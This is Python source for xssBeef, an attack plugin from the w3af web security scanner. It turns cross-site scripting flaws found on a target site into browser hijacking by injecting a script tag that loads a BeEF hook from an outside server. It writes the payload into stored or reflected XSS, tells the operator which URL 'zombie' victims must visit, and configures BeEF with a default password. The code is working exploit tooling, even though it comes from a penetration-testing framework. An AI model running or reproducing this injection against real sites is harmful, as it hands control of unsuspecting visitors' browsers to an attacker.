'''
xssBeef.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


import core.controllers.outputManager as om

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
from core.data.parsers.urlParser import parse_qs, url_object
from core.controllers.w3afException import w3afException

import core.data.kb.knowledgeBase as kb
from core.data.kb.shell import shell as shell

# options
from core.data.options.option import option
from core.data.options.optionList import optionList


class xssBeef(baseAttackPlugin):
    '''
    Exploit XSS vulnerabilities using beEF ( www.bindshell.net/tools/beef/ ) .
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._vuln = None
        
        # User configured variables
        self._beefPasswd = 'BeEFConfigPass'
        # without the hook dir !
        self._beefURL = url_object('http://localhost/beef/')
        
        # A message to the user
        self._message = 'You can start interacting with the beEF server at: '
        self._message += self._beefURL.urlJoin( 'ui/' )
        
    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with BeEF.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return None
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'proxy'
        
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'xss'

    def exploit( self, vulnToExploit=None ):
        '''
        Exploits a XSS vuln that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling specific_user_input
        '''
        om.out.console( 'Browser Exploitation Framework - by Wade Alcorn http://www.bindshell.net' )
        xss_vulns = kb.kb.getData( 'xss' , 'xss' )
        if not self.canExploit():
            raise w3afException('No cross site scripting vulnerabilities have been found.')
        
        # First I'll configure the beef server, if this is unsuccessfull, then nothing else 
        # should be done!
        #
        # GET http://localhost/beef/submit_config.php?config=http://localhost/beef/&passwd=
        #beEFconfigPass HTTP/1.1
        config_URL = self._beefURL.urlJoin('submit_config.php' )
        config_URI = config_URL + '?config=' + self._beefURL + '&passwd=' + self._beefPasswd
        config_URI = url_object( config_URI )
        response = self._urlOpener.GET( config_URI )
        if response.getBody().count('BeEF Successfuly Configured'):
            # everything ok!
            pass
        elif 'Incorrect BeEF password, please try again.' in response.getBody():
            raise w3afException('Incorrect password for beEF configuration.')
        elif 'Permissions on the' in response.getBody():
            raise w3afException('Incorrect BeEF installation')
        else:
            raise w3afException('BeEF installation not found.')
            
        
        # Try to get a proxy using one of the vulns
        for vuln_obj in xss_vulns:
            msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
            om.out.console( msg )
            if self._generateProxy(vuln_obj):
                # TODO: Create a proxy instead of a shell
                # Create the shell object
                shell_obj = xssShell(vuln_obj)
                shell_obj.setBeefURL( self._beefURL )
                kb.kb.append( self, 'shell', shell_obj )
                
                return [ shell_obj, ]
            else:
                msg = 'Failed to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
                om.out.console( msg )
                    
        return []
                
    def _generateProxy( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit.
        @return: True is a proxy could be established using the vuln parameter.
        '''
        # Check if we really can contact the remote beef install
        if self._verifyVuln( vuln_obj ):
            self._vuln = vuln_obj
            return True
        else:
            return False

    def _verifyVuln( self, vuln_obj ):
        '''
        This command verifies a vuln. This is really hard work! :P

        @parameter vuln_obj: The vulnerability to exploit.
        @return : True if vuln can be exploited.
        '''
        # Internal note:
        # <script language="Javascript" src="http://localhost/beef/hook/beefmagic.js.php"></script>
        to_include = '<script language="Javascript" src="' 
        to_include += self._beefURL.urlJoin( 'hook/beefmagic.js.php' ) + '"></script>'
        
        if 'permanent' in vuln_obj.keys():
            # Its a permanent / persistant XSS, nice ! =)
            write_payload_mutant = vuln_obj['write_payload']
            write_payload_mutant.setModValue( to_include )
            
            # Write the XSS
            response = self._sendMutant( write_payload_mutant, analyze=False )
            
            # Read it !
            response = self._sendMutant( vuln_obj['read_payload'], analyze=False )
            
            if to_include in response.getBody():
                msg = 'The exploited cross site scripting is of type permanent. To be activated,'
                msg += ' the zombies should navigate to: ' + vuln_obj['read_payload'].getURI()
                om.out.console( msg )
                om.out.console( self._message )
                return True
            else:
                return False
                        
        else:
            # Its a simple xss
            if vuln_obj.getMethod() == 'GET':
                # I'll be able to exploit this one.
                mutant = vuln_obj.getMutant()
                mutant.setModValue( to_include )
                response = self._sendMutant( mutant, analyze=False )
                if to_include in response.getBody():
                    msg = 'To be activated, the zombies have to navigate to: "'
                    msg += mutant.getURI() + '".'
                    om.out.console( msg )
                    om.out.console( self._message )
                    return True
                else:
                    return False
    
    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'This is the location that the zombies will connect to (do not include the'
        d1 += ' hook directory)'
        h1 = 'This is configuration is directly passed to beEF XSS exploitation framework.'
        o1 = option('beefURL', self._beefURL, d1, 'string', help=h1)
        
        d2 = 'The configuration password for beef.'
        h2 = 'This configuration parameter is needed to change the configuration of beEF.'
        o2 = option('beefPasswd', self._beefPasswd, d2, 'string', help=h2)
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._beefURL = optionsMap['beefURL'].getValue()
        self._beefPasswd = optionsMap['beefPasswd'].getValue()

        if self._beefPasswd == '':
            om.out.error('You have to provide a beEF password to use this plugin.')
            return False
            

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.0
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin is an interface to aid with the exploitation of XSS vulnerabilities using beEF.
        
        Two configurable parameters exist:
            - beefURL
            - beefPasswd
            
        Please note that this plugin is only a "caller" to beef and:
            - You have to install beef
            - After running this plugin you have to infect other users with the URL provided by w3af
            - You have to open a browser and point it to your beef installation in order to manage zombies
        '''
        
class xssShell(shell):
    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        msg = 'TODO: Code some commands here. For now, just execute "exit"'
        msg += ' (this won\'t close BeEF)'
        return msg
        
    def setBeefURL(self, beef_url):
        self._beefURL = beef_url
    
    def end( self ):
        om.out.debug('xssShell cleanup complete.')
        
    def getName( self ):
        return 'xss_shell'
    
    def _identifyOs(self):
        return 'xss'
        
    def __repr__( self ):
        return '<'+self.getName()+' object (Browse to: "'+self._beefURL+'")>'
        
    def getRemoteSystem( self ):
        '''
        @return: dz0@sock3t:~/w3af$ uname -o -r -n -m -s 
        Linux sock3t 2.6.15-27-686 i686 GNU/Linux
        
        Or in this case... the user is using a browser!
        '''
        return 'browser'

    def getRemoteUser( self ):
        return 'user'
        
    def getRemoteSystemName( self ):
        '''
        @return: dz0@sock3t:~/w3af$ uname -n
        sock3t
        '''
        return 'browser'
        
    __str__ = __repr__
